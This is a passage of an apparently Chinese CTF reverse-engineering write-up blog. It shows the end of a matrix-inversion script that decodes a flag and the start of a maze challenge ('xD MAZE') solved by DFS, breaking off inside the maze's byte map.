class="number">22</span>, <span class="number">23</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">23</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">22</span>], [<span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">24</span>, <span class="number">24</span>, <span class="number">24</span>, <span class="number">24</span>, <span class="number">21</span>], [<span class="number">13</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">24</span>, <span class="number">24</span>], [<span class="number">13</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">20</span>], [<span class="number">13</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">19</span>], [<span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>], [<span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">20</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">18</span>], [<span class="number">12</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">19</span>], [<span class="number">12</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">19</span>], [<span class="number">12</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">20</span>], [<span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">22</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">19</span>]])</span><br><span class="line"></span><br><span class="line">encode=Matrix([<span class="number">0x025D15D4</span>, <span class="number">0x024C73B4</span>, <span class="number">0x0243CF71</span>, <span class="number">0x0230134C</span>, <span class="number">0x02132CFE</span>, <span class="number">0x01BE2FCA</span>, <span class="number">0x0142CA26</span>, <span class="number">0x00D61955</span>,</span><br><span class="line">    <span class="number">0x009427A8</span>, <span class="number">0x009B8674</span>, <span class="number">0x0090C832</span>, <span class="number">0x008812C7</span>, <span class="number">0x0080BA58</span>, <span class="number">0x007981E1</span>, <span class="number">0x0072AB68</span>, <span class="number">0x0074CB4B</span>,</span><br><span class="line">    <span class="number">0x00723F3F</span>, <span class="number">0x007CC258</span>, <span class="number">0x0089CD5C</span>, <span class="number">0x0088E2A2</span>, <span class="number">0x008E8906</span>, <span class="number">0x008B88A0</span>, <span class="number">0x008EEC8D</span>, <span class="number">0x008F3573</span>,</span><br><span class="line">    <span class="number">0x008B746F</span>, <span class="number">0x00912C82</span>, <span class="number">0x008D7CF2</span>, <span class="number">0x00832099</span>, <span class="number">0x007F45A5</span>, <span class="number">0x00685AFF</span>, <span class="number">0x0050A4D2</span>, <span class="number">0x00526FE2</span>,</span><br><span class="line">    <span class="number">0x0058923B</span>, <span class="number">0x00529EC1</span>, <span class="number">0x00516D1A</span>, <span class="number">0x005B7453</span>, <span class="number">0x007028E6</span>, <span class="number">0x0089C6FA</span>, <span class="number">0x00A5D6AE</span>, <span class="number">0x00D37A14</span>,</span><br><span class="line">    <span class="number">0x00B8CFAA</span>, <span class="number">0x00B0BB4B</span>, <span class="number">0x00AE69A4</span>, <span class="number">0x00A1154B</span>, <span class="number">0x009DCBE7</span>, <span class="number">0x00A1DC20</span>, <span class="number">0x00AA07E3</span>, <span class="number">0x00B25CB1</span>,</span><br><span class="line">    <span class="number">0x00B2FD98</span>, <span class="number">0x00B12F29</span>, <span class="number">0x00E428A0</span>, <span class="number">0x011B2184</span>, <span class="number">0x01615722</span>, <span class="number">0x01A502F3</span>, <span class="number">0x01C0AA9D</span>, <span class="number">0x01D4169F</span>,</span><br><span class="line">    <span class="number">0x01EF8B76</span>, <span class="number">0x0233E5BB</span>, <span class="number">0x0275A6F0</span>, <span class="number">0x02A9CA35</span>, <span class="number">0x02A8904C</span>, <span class="number">0x02A194EF</span>, <span class="number">0x02926F39</span>, <span class="number">0x028E92C3</span>])</span><br><span class="line">temp=encode*A.inverse()</span><br><span class="line">flag=temp*B.inverse()</span><br><span class="line"></span><br><span class="line">flag=[<span class="built_in">bytes</span>(i).decode() <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是好像现在网站不支持在线测试代码了。所以可能需要配环境。</p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="xD-MAZE"><a href="#xD-MAZE" class="headerlink" title="xD MAZE"></a>xD MAZE</h3><p>走迷宫，但是走的方式不一样，可以打印出地图慢慢走，或者写个dfs脚本。</p><p>改了下之前的一个脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">map</span>=[ <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x20</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span class="number">0x20</span>, <span class="number">0x23</span>, <span class="number">0x23</span>, <span 